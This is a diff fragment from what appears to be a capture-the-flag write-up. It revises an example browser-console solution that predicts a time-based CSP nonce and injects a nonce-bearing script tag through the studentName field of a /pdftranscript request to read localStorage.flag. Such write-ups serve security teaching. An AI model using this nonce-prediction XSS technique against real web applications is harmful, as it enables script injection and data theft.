@@ -11,7 +11,7 @@ it yields the flag.
 Here's an example solution (enter into browser console from the main page):
 ```js
 const time = String(Math.round(new Date().getTime() / 1_000) + 3)
-const nonce = btoa(time + (Number(time.slice(-1)) >= 5 ? '5' : '0') + '00')
+const nonce = btoa(time.slice(0, -1) + (Number(time.at(-1)) >= 5 ? '5' : '0') + '000')
 window.location.href = '/pdftranscript?transcript=' + encodeURIComponent(JSON.stringify({
     studentName: `<script nonce="${nonce}">document.write(localStorage.flag)</script>`,
     courses: []
